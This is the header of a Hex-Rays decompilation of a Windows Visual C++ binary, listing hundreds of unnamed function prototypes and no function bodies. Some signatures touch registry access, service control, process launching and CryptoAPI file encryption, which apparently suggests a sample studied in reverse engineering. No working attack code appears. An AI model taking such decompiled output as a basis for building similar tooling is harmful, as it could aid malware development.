/* This file was generated by the Hex-Rays decompiler version 8.3.0.230608.
   Copyright (c) 2007-2021 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <math.h>
#include <defs.h>

#include <stdarg.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

int sub_401000();
int sub_401020();
int sub_401040();
int sub_401060();
int sub_401080();
int sub_4010A0();
int sub_4010C0();
int sub_4010E0();
int sub_401100();
int sub_401120();
int sub_401140();
int sub_401160();
int sub_401180();
int sub_4011A0();
int sub_4011C0();
int sub_4011E0();
int sub_401200();
int sub_401220();
int sub_401240();
int sub_401260();
int sub_401280();
int sub_4012A0();
int sub_4012C0();
int sub_4012E0();
int sub_401300();
int sub_401320();
int sub_401340();
int sub_401360();
int sub_401380();
int sub_4013A0();
int sub_4013C0();
int sub_4013E0();
int sub_401400();
int sub_401420();
int sub_401440();
int sub_401460();
int sub_401480();
int sub_4014A0();
int sub_4014C0();
int sub_4014E0();
int sub_401500();
int sub_401520();
int sub_401540();
int sub_401560();
int sub_401580();
int sub_4015A0();
int sub_4015C0();
int sub_4015E0();
int sub_401600();
int sub_401620();
int sub_401640();
int sub_401660();
int sub_401680();
int sub_4016A0();
int sub_4016C0();
int sub_4016E0();
int sub_401700();
int sub_401720();
int sub_401740();
int sub_401760();
int sub_401780();
int sub_4017A0();
int sub_4017C0();
int sub_4017E0();
int sub_401800();
int sub_401820();
int sub_401840();
int sub_401860();
int sub_401880();
int sub_4018A0();
int sub_4018C0();
int sub_4018E0();
int sub_401900();
int sub_401920();
int sub_401940();
int sub_401960();
int sub_401980();
int sub_4019A0();
int sub_4019C0();
int sub_4019E0();
int sub_401A00();
int sub_401A20();
int sub_401A40();
int sub_401A60();
int sub_401A80();
int sub_401AA0();
int sub_401AC0();
int sub_401AE0();
int sub_401B00();
int sub_401B20();
int sub_401B40();
int sub_401B60();
int sub_401B80();
int sub_401BA0();
int sub_401BC0();
int sub_401BE0();
int sub_401C00();
int sub_401C20();
int sub_401C40();
int sub_401C60();
int sub_401C80();
int sub_401CA0();
int sub_401CC0();
int sub_401CE0();
int sub_401D00();
int sub_401D20();
int sub_401D40();
int sub_401D60();
int sub_401D80();
int sub_401DA0();
int sub_401DC0();
int sub_401DE0();
int sub_401E00();
int sub_401E20();
int sub_401E40();
int sub_401E60();
int sub_401E80();
int sub_401EA0();
int sub_401EC0();
int sub_401EE0();
int sub_401F00();
int sub_401F20();
int sub_401F40();
int sub_401F60();
int sub_401F80();
int sub_401FA0();
int sub_401FC0();
int sub_401FE0();
int sub_402000();
int sub_402020();
int sub_402040();
int sub_402060();
int sub_402080();
int sub_4020A0();
int sub_4020C0();
int sub_4020E0();
int sub_402100();
int sub_402120();
int sub_402140();
int sub_402160();
int sub_402180();
int sub_4021A0();
int sub_4021C0();
int sub_4021E0();
int sub_402200();
int sub_402220();
int sub_402240();
int sub_402260();
int sub_402280();
int sub_4022A0();
int sub_4022C0();
int sub_4022E0();
int sub_402300();
int sub_402320();
int sub_402340();
int sub_402360();
int sub_402380();
int sub_4023A0();
int sub_4023C0();
int sub_4023E0();
int sub_402400();
int sub_402420();
int sub_402440();
int sub_402460();
int sub_402480();
int sub_4024A0();
int sub_4024C0();
int sub_4024E0();
int sub_402500();
int sub_402520();
int sub_402540();
int sub_402560();
int sub_402580();
int sub_4025A0();
int sub_4025C0();
int sub_4025E0();
int sub_402600();
int sub_402620();
int sub_402640();
int sub_402660();
int sub_402680();
int sub_4026A0();
int sub_4026C0();
int sub_4026E0();
int sub_402700();
int sub_402720();
int sub_402740();
int sub_402760();
int sub_402780();
int sub_4027A0();
int sub_4027C0();
int sub_4027E0();
int sub_402800();
int sub_402820();
int sub_402840();
int sub_402860();
int sub_402880();
int sub_4028A0();
int sub_4028C0();
int sub_4028E0();
int sub_402900();
int sub_402920();
int sub_402940();
int sub_402960();
int sub_402980();
int sub_4029A0();
int sub_4029C0();
int sub_4029E0();
int sub_402A00();
int sub_402A20();
int sub_402A40();
int sub_402A60();
int sub_402A80();
int sub_402AA0();
int sub_402AC0();
int sub_402AE0();
int sub_402B00();
int sub_402B20();
int sub_402B40();
int sub_402B60();
int sub_402B80();
int sub_402BA0();
int sub_402BC0();
int sub_402BE0();
int sub_402C00();
int sub_402C20();
int sub_402C40();
int sub_402C60();
int sub_402C80();
int sub_402CA0();
int sub_402CC0();
int sub_402CE0();
int sub_402D00();
int sub_402D20();
int sub_402D40();
int sub_402D60();
int sub_402D80();
int sub_402DA0();
int sub_402DC0();
int sub_402DE0();
int sub_402E00();
int sub_402E20();
int sub_402E40();
int sub_402E60();
int sub_402E80();
int sub_402EA0();
int sub_402EC0();
int sub_402EE0();
int sub_402F00();
int sub_402F20();
int sub_402F40();
int sub_402F60();
int sub_402F80();
int sub_402FA0();
int sub_402FC0();
int sub_402FE0();
int sub_403000();
int sub_403020();
int sub_403040();
int sub_403060();
int sub_403080();
int sub_4030A0();
int sub_4030C0();
int sub_4030E0();
int sub_403100();
int sub_403120();
int sub_403140();
int sub_403160();
int sub_403180();
int sub_4031A0();
int sub_4031C0();
int sub_4031E0();
int sub_403200();
int sub_403220();
int sub_403240();
int sub_403260();
int sub_403280();
int sub_4032A0();
int sub_4032C0();
int sub_4032E0();
int sub_403300();
int sub_403320();
int sub_403340();
int sub_403360();
int sub_403380();
int sub_4033A0();
int sub_4033C0();
int sub_4033E0();
int sub_403400();
int sub_403420();
int sub_403440();
int sub_403460();
int sub_403480();
int sub_4034A0();
int sub_4034C0();
int sub_4034E0();
int sub_403500();
int sub_403520();
int sub_403540();
int sub_403560();
int sub_403580();
int sub_4035A0();
int sub_4035C0();
int sub_4035E0();
int sub_403600();
int sub_403620();
int sub_403640();
int sub_403660();
int sub_403680();
int sub_4036A0();
int sub_4036C0();
int sub_4036E0();
int sub_403700();
int sub_403720();
int sub_403740();
int sub_403760();
int sub_403780();
int sub_4037A0();
int sub_4037C0();
int sub_4037E0();
int sub_403800();
int sub_403820();
int sub_403840();
int sub_403860();
int sub_403880();
int sub_4038A0();
int sub_4038C0();
int sub_4038E0();
int sub_403900();
int sub_403920();
int sub_403940();
int sub_403960();
int sub_403980();
int sub_4039A0();
int sub_4039C0();
int sub_4039E0();
int sub_403A00();
int sub_403A20();
int sub_403A40();
int sub_403A60();
int sub_403A80();
int sub_403AA0();
int sub_403AC0();
int sub_403ADD();
int sub_403B0F();
int sub_403B25();
int sub_403B31();
int sub_403B47();
int sub_403B53();
int sub_403B5F();
int sub_403B75();
int sub_403B90();
int sub_403B9C();
FILE *sub_403BA8();
uintptr_t sub_403BB6();
void sub_403BC1();
// void *__cdecl operator new(unsigned int, void *); idb
char *__thiscall sub_403C10(char *this, int a2);
// int __thiscall unknown_libname_1(_DWORD); weak
const char *__thiscall sub_403C60(_DWORD *this);
char *__thiscall sub_403C70(char *Block, char a2);
char *__thiscall sub_403CA0(char *this);
void __noreturn sub_403CC0(void); // weak
char *__thiscall sub_403CE0(char *this, int a2);
char *__thiscall sub_403D20(char *this, int a2);
// void __cdecl std::_Adjust_manually_vector_aligned(void **, unsigned int *); idb
char *__thiscall sub_403D90(int *this, int a2);
// int __userpurge sub_403DF0@<eax>(int a1@<ebp>, int a2, WCHAR a3);
_DWORD *__thiscall sub_404010(_DWORD *this, _DWORD *a2, int a3, int a4);
int __thiscall sub_4040C0(_DWORD *this);
_WORD *__thiscall sub_404120(_WORD *this, unsigned int a2, unsigned __int16 a3);
_DWORD *__thiscall sub_404200(_DWORD *this, unsigned int a2, unsigned __int16 a3);
_DWORD *__thiscall sub_404330(_DWORD *this, void *a2, unsigned int a3);
void __stdcall sub_404440(int a1, int a2);
void __stdcall sub_404460(_DWORD *Block, int a2);
_DWORD *__thiscall sub_4044A0(_DWORD *Src, const void *a2, unsigned int a3);
void __noreturn sub_404630(void); // weak
char *__thiscall sub_404640(int *this, int a2, int a3);
void __fastcall sub_4047B0(int a1, int a2);
void __cdecl sub_404820(void *a1, unsigned int a2);
void __noreturn sub_404860(void); // weak
int __thiscall sub_404870(int *this, int a2, int a3, int a4);
void __noreturn sub_404900(void); // weak
_DWORD *__stdcall sub_404910(unsigned int a1);
unsigned int __cdecl sub_404970(int a1, unsigned int a2, unsigned int a3);
int __fastcall sub_4049B0(int a1, int a2, int a3);
_DWORD *__cdecl sub_404A10(size_t a1);
_DWORD *__thiscall sub_404A70(_DWORD *this);
char sub_404AF0();
_DWORD *__stdcall sub_404E00(DWORD a1);
int __thiscall sub_4052C0(_DWORD *this);
int __stdcall sub_4053B0(int a1, WCHAR a2);
void __thiscall sub_405460(_DWORD *this);
_DWORD *__thiscall sub_4054E0(_DWORD *this, _DWORD *a2, unsigned __int16 a3);
_DWORD *__thiscall sub_405520(_DWORD *this, _QWORD *a2);
_DWORD *__thiscall sub_4055B0(_DWORD *this, _DWORD *Src);
_DWORD *__thiscall sub_405640(_DWORD *Src, unsigned int a2, unsigned __int16 a3);
unsigned int __thiscall sub_4057F0(_DWORD *this, _DWORD *Src);
int __thiscall sub_405870(_DWORD *this, int a2, int a3);
char *__thiscall sub_4058F0(int *this, int a2, int a3);
int __fastcall sub_405B20(int a1, int a2, int a3);
char *__thiscall sub_405BE0(char *this, int a2);
void __thiscall sub_405C30(void *Block);
void *__thiscall sub_405C40(void *this, void *a2);
_QWORD *__cdecl sub_405C60(_QWORD *a1);
void __cdecl __noreturn sub_405C90(int Block);
int __thiscall sub_405CD0(volatile signed __int32 *this);
int __stdcall sub_405D00(int a1);
char *__thiscall sub_405D10(char *this, int a2);
char *__thiscall sub_405D70(char *this, int a2);
_DWORD *__fastcall sub_405DB0(_DWORD *a1, const CHAR *lpMultiByteStr);
_DWORD *__fastcall sub_405EF0(_DWORD *a1, const WCHAR *lpWideCharStr);
int __fastcall sub_406040(int a1, unsigned int a2);
bool __thiscall sub_406120(void *this, int a2, _DWORD *a3);
bool __thiscall sub_406160(_DWORD *this, _DWORD *a2, int a3);
// int __userpurge sub_406190@<eax>(int a1@<ecx>, int a2@<ebp>, int a3, int a4, _DWORD *a5);
char *__thiscall sub_406360(char *Block, char a2);
_DWORD *__thiscall sub_406390(_DWORD *this, int a2, int a3);
char *__thiscall sub_406450(char *this, int a2);
char *__thiscall sub_4064A0(char *this, int a2);
const char *sub_4064F0();
void **__stdcall sub_406500(void **a1, int a2);
void *__thiscall sub_406550(void *Block, char a2);
void *sub_406570();
int __cdecl sub_4065A0(int a1);
char *__thiscall sub_4065C0(char *this, int a2);
void __cdecl sub_406620(Concurrency::details *Block);
int __stdcall sub_406690(int a1, int a2);
Concurrency::details *__thiscall sub_406710(Concurrency::details *this, int a2);
int sub_406770();
signed __int32 __thiscall sub_406830(volatile signed __int32 *this);
int __thiscall sub_406850(int (__thiscall ***this)(void *, int));
_DWORD *__thiscall sub_406860(_DWORD *Block, char a2);
char *__thiscall sub_406890(char *this, int a2);
void __thiscall sub_4068E0(char *this);
char *__thiscall sub_406910(char *Block, char a2);
int __thiscall sub_406950(int this, int a2);
int __thiscall sub_406AD0(int this, int a2);
int __thiscall sub_406C80(volatile signed __int32 **this);
int __cdecl sub_406CE0(int a1);
_DWORD *__thiscall sub_406D30(_DWORD *Block, char a2);
int __thiscall sub_406D60(int this); // idb
int __thiscall sub_406E10(char *this);
// void __usercall sub_406EA0(_DWORD *a1@<edx>, int a2);
int __thiscall sub_406F70(_DWORD *this);
void __thiscall __noreturn sub_406FA0(void *this);
char *__thiscall sub_406FC0(char *this, int a2);
void __cdecl sub_407060(_DWORD *Block);
int __thiscall sub_407110(_DWORD *this);
void sub_407140();
void __thiscall sub_407180(_DWORD *this);
void __thiscall __noreturn sub_407220(volatile __int32 *Block);
unsigned int *__thiscall sub_407250(unsigned int *this, unsigned int *a2);
unsigned int *__thiscall sub_4072C0(unsigned int *this, unsigned int *a2);
void sub_4073B0();
char *__thiscall sub_4073F0(char *this, int a2, int a3, volatile signed __int32 *a4, int a5);
void __thiscall sub_407540(char *this);
int __thiscall sub_407670(int this);
char __thiscall sub_407760(unsigned int *this, void *a2);
bool __thiscall sub_4078A0(_DWORD *this);
int __thiscall sub_4078B0(_DWORD *this, int a2, int a3);
void __thiscall sub_4079B0(_DWORD *this, int a2);
int __thiscall sub_407B30(int *this);
char *__thiscall sub_407CB0(char *Block, char a2);
int __cdecl sub_407D00(int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int *a10);
void __thiscall sub_407DF0(_DWORD *this);
_DWORD *__fastcall sub_407EE0(_DWORD *a1, int a2);
const char *__cdecl sub_407F20(int a1);
const char *sub_407F70();
void **__stdcall sub_407F80(void **a1, int a2);
int __thiscall sub_408040(int *this);
_DWORD *__thiscall sub_4080B0(void *this, _DWORD *a2);
void __thiscall sub_408480(void *this, int a2);
int __stdcall sub_408810(int a1);
bool __stdcall sub_408B10(LPCWCH lpWideCharStr, LPCWCH a2);
_DWORD *__stdcall sub_408CF0(_DWORD *a1, LPWSTR servername);
void __thiscall sub_4091E0(int this, int a2, char a3);
_DWORD __stdcall nullsub_1(_DWORD); // weak
char sub_409270();
char *__thiscall sub_409280(char *this, char a2);
int __thiscall sub_4093C0(char *this);
char __thiscall sub_4094E0(int this, char a2, char a3, int a4, _DWORD *a5);
int __thiscall sub_4096F0(char **this, int a2, __int64 a3, int a4);
int __thiscall sub_4099E0(_DWORD *this);
int __thiscall sub_409AC0(_DWORD *this);
void __thiscall sub_409AE0(Concurrency::details **this);
int __thiscall sub_409B40(void *this);
int __thiscall sub_409B50(_Mtx_t *this);
void __thiscall sub_409BA0(int this);
_BYTE *__thiscall sub_409BF0(_BYTE *this, _Mtx_t a2);
_DWORD *__thiscall sub_409C20(_DWORD *this, void *a2);
void **__thiscall sub_409C70(void **Src, _DWORD *Srca);
void __thiscall sub_409CE0(_DWORD *this);
_DWORD *__thiscall sub_409D30(_DWORD *this, int a2);
void **__thiscall sub_409D70(void **this, void *a2);
_DWORD *__thiscall sub_409DB0(_DWORD *this, _DWORD *Src);
char *__thiscall sub_409E70(char *Block, char a2);
char *__thiscall sub_409ED0(char *Block, char a2);
char *__thiscall sub_409F90(char *Block, char a2);
void __thiscall sub_409FF0(char *this, char a2, int a3, int a4);
int __thiscall sub_40A0F0(int this, char a2);
char *__thiscall sub_40A1C0(unsigned int *this, unsigned int a2);
void **__thiscall sub_40A250(void **this, size_t Size, char a3);
void **__thiscall sub_40A390(void **this, void *a2, size_t Size);
void **__thiscall sub_40A4D0(void **Src, void *Srca, size_t Size);
void __thiscall sub_40A530(_DWORD *this, _DWORD *Src);
__int32 __cdecl sub_40A5E0(volatile __int32 *a1, __int32 a2);
_DWORD *__thiscall sub_40A5F0(int *this, int a2, _DWORD *Src);
char *__thiscall sub_40A790(int this, char *a2, char *a3);
int __fastcall sub_40A9C0(unsigned __int16 *a1, int a2, int a3, __int16 *a4, int a5);
int __fastcall sub_40AB20(int a1, unsigned int a2, unsigned int a3, unsigned __int16 *a4, unsigned int a5);
void **__thiscall sub_40ABF0(void **this, size_t Size, int a3, char a4);
void **__thiscall sub_40AD00(void **Src, unsigned int a2, int a3, const void *a4, size_t a5);
void __fastcall sub_40AE60(int *a1, int *a2);
int __thiscall sub_40AEE0(void *this);
int __thiscall sub_40AEF0(int (__thiscall ***this)(_DWORD, _DWORD));
void __thiscall sub_40AF00(_DWORD *this);
void __thiscall sub_40AF10(_DWORD *Src, unsigned int a2);
_DWORD *__thiscall sub_40B020(_DWORD *Block, char a2);
_DWORD *__thiscall sub_40B050(_DWORD *Block, char a2);
char **__thiscall sub_40B080(char **Src, int a2, char *a3, unsigned int a4);
unsigned int __cdecl sub_40B250(int a1, unsigned int a2, unsigned int a3);
int __stdcall sub_40B290(void *a1, _DWORD *a2, void **a3);
int __stdcall sub_40B2B0(void *a1, void *a2, void **a3); // idb
int __stdcall sub_40B320(void *a1, _DWORD *a2, void **a3);
void __thiscall sub_40B340(void *Block, char a2);
char *__thiscall sub_40B360(char *this);
void ***sub_40B370();
int __thiscall sub_40B380(_DWORD *this);
_DWORD *__thiscall sub_40B3B0(_DWORD *this, _DWORD *a2);
char *__thiscall sub_40B3D0(int this, char a2);
int __thiscall sub_40B400(_DWORD *this);
void __thiscall sub_40B420(_DWORD *Block, char a2);
char *__thiscall sub_40B460(char *this);
void ***sub_40B470();
char __thiscall sub_40B480(_DWORD *this);
_DWORD *__thiscall sub_40B4A0(_DWORD *this, int a2);
void ***sub_40B520();
int __thiscall sub_40B530(int *this);
_DWORD *__thiscall sub_40B540(_DWORD *this, _DWORD *a2);
void __thiscall sub_40B560(_DWORD *Block, char a2);
void ***sub_40B5B0();
int __thiscall sub_40B5C0(int this);
_DWORD *__thiscall sub_40B5D0(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_40B620(_DWORD *this, _DWORD *a2);
char *__thiscall sub_40B670(char *Block, char a2);
void __thiscall sub_40B720(char *this);
int __thiscall sub_40B790(int *this);
int __thiscall sub_40B8C0(int this, __int128 *a2);
char *__thiscall sub_40BA10(char *this, __int128 *a2);
_QWORD *sub_40BAC0(int a1, ...);
char *__thiscall sub_40BBA0(char *Block, char a2);
_DWORD *__thiscall sub_40BBD0(_DWORD *this, int a2);
int __thiscall sub_40BC20(int this, int a2, int a3);
void __thiscall sub_40BE80(_DWORD *Block, char a2);
void ***sub_40BEF0();
void __thiscall sub_40BF00(int this);
int __thiscall sub_40BF10(int this, int a2);
void __cdecl __noreturn sub_40BF70(void *a1); // idb
void __thiscall __noreturn sub_40BF90(_DWORD *this, void *a2);
int __thiscall sub_40BFB0(_DWORD *this);
void __cdecl __noreturn sub_40C140(void *a1);
_DWORD *__thiscall sub_40C160(_DWORD *Block, char a2);
_DWORD *__thiscall sub_40C200(_DWORD *Block, char a2);
int __thiscall sub_40C2A0(int this);
void *__thiscall sub_40C330(void *this);
void ***sub_40C340();
int __thiscall sub_40C350(int **this);
_DWORD *__thiscall sub_40C360(_DWORD *this, _DWORD *a2);
char __fastcall sub_40C380(_DWORD *a1, char *a2);
bool __fastcall sub_40C420(HKEY hKey, const WCHAR *lpSubKey, LPCWSTR lpValueName, BYTE *lpData);
void **__fastcall sub_40C4B0(void **Src, _DWORD *a2);
// int __usercall sub_40C780@<eax>(_DWORD *a1@<edx>, int a2@<ecx>, int a3@<ebp>);
char __stdcall sub_40C990(_DWORD *a1);
// _DWORD __stdcall __std_fs_get_stats(_DWORD, _DWORD); weak
// int __stdcall sub_40CF50(LPCWSTR lpValueName, BYTE *lpData, int); idb
char __stdcall sub_40D050(LPWSTR lpCommandLine);
void __stdcall sub_40D0F0(int a1);
char __stdcall sub_40D300(LPCWSTR lpServiceName, DWORD dwMilliseconds);
struct _ENUM_SERVICE_STATUSW *__stdcall sub_40D490(SC_HANDLE a1, SC_HANDLE hService, DWORD dwMilliseconds);
unsigned __int8 __thiscall sub_40D670(void **this, char a2);
_DWORD *__fastcall sub_40D6B0(_DWORD *Src, _DWORD *a2, const unsigned __int16 *a3);
int __fastcall sub_40D780(int a1, char *a2, void *Src);
void **__thiscall sub_40D800(void **Src, unsigned int a2, int a3, char a4);
BSTR **__thiscall sub_40D940(BSTR **this, int a2);
BSTR **__thiscall sub_40D9E0(BSTR **this, OLECHAR *psz);
void __thiscall sub_40DA90(int *this);
// char __userpurge sub_40DB00@<al>(int a1@<ebp>, int a2@<edi>, int a3@<esi>, int a4, int a5, BSTR *a6);
// _DWORD *__userpurge sub_40E6B0@<eax>(int a1@<ebp>, _DWORD *a2, int a3);
int __thiscall sub_40E8C0(int *Src, __int16 a2);
void **__thiscall sub_40E9F0(_DWORD *this, unsigned int a2, int a3);
void **__thiscall sub_40EA60(void **Src, size_t Size, int a3);
void **__thiscall sub_40EAC0(void **Src, unsigned int a2, int a3, size_t a4, char a5);
char __thiscall sub_40EC80(_DWORD *this);
void __thiscall sub_40ED20(_DWORD *this, int a2);
void sub_40EF90();
int __thiscall sub_40F4B0(int this);
_DWORD *__thiscall sub_40F600(_DWORD *Block, char a2);
_DWORD _guard_check_icall_nop(); // weak
void __thiscall sub_40F6B0(_DWORD *this);
_DWORD *__thiscall sub_40F6C0(_DWORD *Block, char a2);
void __noreturn sub_40F6F0(void); // weak
_DWORD *__thiscall sub_40F700(_DWORD *this, int a2, volatile signed __int32 *a3, int a4);
_DWORD *__thiscall sub_40F7F0(_DWORD *Block, char a2);
void __thiscall sub_40F840(_DWORD *this);
void __thiscall sub_40F8F0(_DWORD *this, int a2);
int __thiscall sub_40F950(int *this, int a2);
int __thiscall sub_40FA20(int *this, int a2, int a3);
int __thiscall sub_40FAF0(int *this, int a2, int *a3);
_DWORD *__thiscall sub_40FC10(int *this, _DWORD *a2, int *a3);
void *__thiscall sub_40FC60(void *this, int a2, void **Block);
int __thiscall sub_40FCD0(_DWORD *this, _DWORD *a2, int a3, int a4);
void __thiscall sub_40FF00(int *this, int a2);
int *__thiscall sub_410010(int *this);
int **__thiscall sub_410070(_DWORD *this, int **a2);
void __stdcall sub_410450(int a1, void **Block);
int __fastcall sub_4104B0(int a1, int a2, int a3);
_DWORD *__fastcall sub_4105C0(_DWORD *a1, int *a2);
int __fastcall sub_410770(int a1, _DWORD *a2, int a3, char a4);
int *__thiscall sub_410850(int *this, int a2, volatile signed __int32 *a3);
_DWORD *__thiscall sub_410F50(_DWORD *Block, char a2);
void __thiscall sub_410F80(_DWORD *this);
int __thiscall sub_411330(int *this);
int __thiscall sub_411580(_DWORD *this, int a2);
int __stdcall sub_4119A0(int a1);
_DWORD *__thiscall sub_411B30(int *this, void *a2);
void __thiscall sub_411C90(unsigned int *this, void *a2);
void **__thiscall sub_411EE0(void **this, void *a2);
_DWORD *__thiscall sub_411F10(_DWORD *this, void *a2);
void __thiscall sub_411F40(unsigned int **this, void *a2);
void __thiscall sub_411F70(unsigned int **this, void *a2);
void __thiscall sub_411FB0(unsigned int **this, void *a2);
void __thiscall sub_411FF0(unsigned int **this, void *a2);
int __thiscall sub_412030(_DWORD *this, void *a2);
int __thiscall sub_412050(_DWORD *this, void *a2);
__int64 __thiscall sub_412070(_DWORD *this, void *a2);
void **__thiscall sub_4120A0(void **this, void *a2);
_DWORD *__thiscall sub_4120E0(_DWORD *this, void *a2);
void **__thiscall sub_412120(void **this, void *a2);
unsigned int **__thiscall sub_412160(unsigned int **this, unsigned int **a2);
void **__thiscall sub_412190(void **this, void **a2);
char *__thiscall sub_4121C0(unsigned int *this, unsigned int a2);
const void **__thiscall sub_412250(_DWORD *Src, unsigned int a2, unsigned int a3, char *Srca, size_t Size);
void *__thiscall sub_4123C0(void *this, int a2);
int __thiscall sub_412420(void *this);
int __thiscall sub_4124A0(void *this);
_DWORD *__fastcall sub_412520(_DWORD *Src, _DWORD *a2, unsigned int *a3);
int __thiscall sub_4125C0(void *this);
int __thiscall sub_412640(void *this);
int __thiscall sub_4126C0(void *this);
int __thiscall sub_412740(void *this);
int __thiscall sub_4127C0(void *this);
int __thiscall sub_412840(void *this);
int __thiscall sub_4128C0(void *this);
int __thiscall sub_412940(void *this);
int __thiscall sub_4129C0(void *this);
int __thiscall sub_412A40(void *this);
int __thiscall sub_412AC0(void *this);
int __thiscall sub_412B40(void *this);
_DWORD *__stdcall sub_412BC0(_DWORD *Src, _DWORD *a2, _DWORD *a3);
const void **__thiscall sub_412C60(const void **Src, unsigned int a2, int a3, size_t Size, int a5, const void *a6, size_t a7);
void __thiscall sub_412DF0(_DWORD *this, int a2);
void __thiscall sub_412F10(unsigned int **this, unsigned int *a2, unsigned int *a3, int a4);
void __thiscall sub_413090(void *Block, char a2);
void ***sub_4130B0();
int __thiscall sub_4130C0(int this);
int __thiscall sub_4130D0(int this, int a2);
unsigned int *__fastcall sub_413100(unsigned int *a1, unsigned int *a2, unsigned int *a3);
_DWORD *__thiscall sub_413160(_DWORD *Block, char a2);
_DWORD *__thiscall sub_413190(_DWORD *this, int a2);
int __thiscall sub_4131D0(_DWORD *this);
_DWORD *__thiscall sub_413240(_DWORD *Block, char a2);
int __thiscall sub_413270(_DWORD *this);
_DWORD *__thiscall sub_4132E0(_DWORD *Block, char a2);
int __thiscall sub_413310(int this, int a2, volatile signed __int32 *a3);
_DWORD *__thiscall sub_4134B0(_DWORD *Block, char a2);
int __thiscall sub_413530(int *this);
int __thiscall sub_413600(int this, void *a2);
char __thiscall sub_4137E0(int this, void *a2);
void **__thiscall sub_413A30(void **this, void *a2);
HCRYPTPROV __thiscall sub_413A60(int this);
bool __thiscall sub_413AC0(int this, LPCWSTR lpFileName);
char __thiscall sub_413BB0(_DWORD *this, HCRYPTKEY hKey, HANDLE hFile, int a4);
char __thiscall sub_413F50(HCRYPTPROV *this);
void __thiscall sub_414300(void **Src, unsigned int a2);
_DWORD *__thiscall sub_414430(_DWORD *this, _QWORD *a2);
void __thiscall sub_4144B0(_DWORD *this, int a2, int a3);
void *__thiscall sub_414530(void *this, int a2);
int __thiscall sub_414590(void *this);
int __thiscall sub_414610(void *this);
int __thiscall sub_414690(void *this);
void ***sub_414710();
int __thiscall sub_414720(int this, int a2);
_DWORD *__fastcall sub_414750(_DWORD *a1, int a2);
_DWORD *__fastcall sub_4148A0(_DWORD *a1, unsigned __int16 *a2);
int __thiscall sub_414980(_DWORD *this);
_DWORD *__thiscall sub_4149F0(_DWORD *Block, char a2);
_DWORD *__thiscall sub_414A20(_DWORD *this, int a2, _DWORD *Block, int a4, int a5, int a6, int a7, unsigned int a8);
_DWORD *__thiscall sub_414B40(_DWORD *Block, char a2);
int __thiscall sub_414BC0(_DWORD *this);
_DWORD *__thiscall sub_414C30(_DWORD *Block, char a2);
_DWORD *__thiscall sub_414C60(_DWORD *this, int a2);
void __thiscall sub_414CA0(_DWORD *this);
_DWORD *__thiscall sub_414D30(_DWORD *Block, char a2);
_DWORD *__thiscall sub_414D60(_DWORD *this, int a2);
void __thiscall sub_414DA0(_DWORD *this);
_DWORD *__thiscall sub_414E30(_DWORD *Block, char a2);
_DWORD *__thiscall sub_414E60(_DWORD *this, int a2);
int __thiscall sub_414EA0(_DWORD *this);
_DWORD *__thiscall sub_414F10(_DWORD *Block, char a2);
int __thiscall sub_414F40(_DWORD *this);
_DWORD *__thiscall sub_414FB0(_DWORD *Block, char a2);
_DWORD *__fastcall sub_414FE0(int a1, int a2, int a3, volatile signed __int32 *a4);
_QWORD *__stdcall sub_416880(_DWORD *a1);
_DWORD *__thiscall sub_416930(_DWORD *Block, char a2);
void __thiscall sub_416960(_DWORD *this);
int __thiscall sub_416BE0(int *this);
void __thiscall sub_416CB0(_DWORD *this, int a2);
char __thiscall sub_416D70(_DWORD *this, void *a2);
int __thiscall sub_417080(_DWORD *this);
void __thiscall sub_417130(_DWORD *this, void *a2);
char __thiscall sub_417170(_DWORD *this, int a2);
void __thiscall sub_417300(_DWORD *this, _DWORD *a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11, int *a12);
int __thiscall sub_417830(int this, int a2);
char __thiscall sub_4179D0(_DWORD *this, int *a2);
bool __stdcall sub_417A80(int *a1);
void __thiscall sub_417B20(_DWORD *this);
void *__thiscall sub_417B90(void *this, int a2);
int __thiscall sub_417BF0(void *this);
char *__thiscall sub_417C70(_DWORD *this, _DWORD *a2, int a3);
int __thiscall sub_417E60(void *this);
int __thiscall sub_417EF0(char *this, _QWORD *a2);
int __fastcall sub_418180(_DWORD *a1, _DWORD *a2, int a3);
void ***sub_418250();
void __thiscall sub_418260(int *this, _DWORD *Src);
_DWORD *__thiscall sub_418370(_DWORD *this, _DWORD *a2);
void ***sub_418390();
int __thiscall sub_4183A0(int this, int a2);
int __thiscall sub_4183D0(int this, _DWORD *a2);
int __thiscall sub_418520(_DWORD *this, _DWORD *a2);
_QWORD *sub_418670(int a1, ...);
_DWORD *__thiscall sub_418750(_DWORD *this, _DWORD *a2);
int __thiscall sub_4187E0(int this, int a2, int a3);
void __thiscall sub_418A40(_DWORD *Block, char a2);
void ***sub_418A70();
int __thiscall sub_418A80(int this);
void __noreturn sub_418A90(); // weak
void __thiscall __noreturn sub_418AC0(void *this, int a2, int a3);
int __thiscall sub_418B20(_DWORD *this);
_DWORD *__thiscall sub_418CB0(_DWORD *Block, char a2);
_DWORD *__thiscall sub_418D50(_DWORD *Block, char a2);
void __thiscall __noreturn sub_418DF0(_DWORD *this, void *a2);
void __cdecl __noreturn sub_418E20(void *a1);
void ***sub_418E40();
_DWORD *__thiscall sub_418E50(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_418E70(_DWORD *Block, char a2);
int __thiscall sub_418EA0(int *this);
int __stdcall sub_418F30(int a1, int a2);
int __stdcall sub_419390(void *a1);
int __thiscall sub_4198A0(_DWORD *this);
int __thiscall sub_4199E0(void *this);
void ***sub_419A60();
int __thiscall sub_419A70(int this, int a2);
char *__thiscall sub_419AA0(char *Block, char a2);
int __thiscall sub_419AF0(int *this);
void __stdcall sub_419BF0(void *a1);
void __thiscall sub_419DF0(int this, void *a2);
char __stdcall sub_419E80(void *a1);
DWORD __stdcall sub_419EA0(void *a1);
int *__thiscall sub_419FD0(int *this, int *a2);
void *__thiscall sub_41A080(void *this, int a2);
int __thiscall sub_41A0E0(void *this);
int __thiscall sub_41A160(void *this);
int __thiscall sub_41A1E0(void *this);
int __thiscall sub_41A260(void *this);
void ***sub_41A2E0();
int __thiscall sub_41A2F0(int this, int a2);
_DWORD *__thiscall sub_41A320(_DWORD *Block, char a2);
int __thiscall sub_41A350(int *this);
char __stdcall sub_41A560(void *a1);
char __thiscall sub_41A5C0(_DWORD *this, int a2);
char __thiscall sub_41A5E0(_DWORD *this, void *a2);
void __stdcall sub_41A610(int a1);
void __stdcall sub_41A760(void *a1);
int __stdcall sub_41A7D0(void *a1);
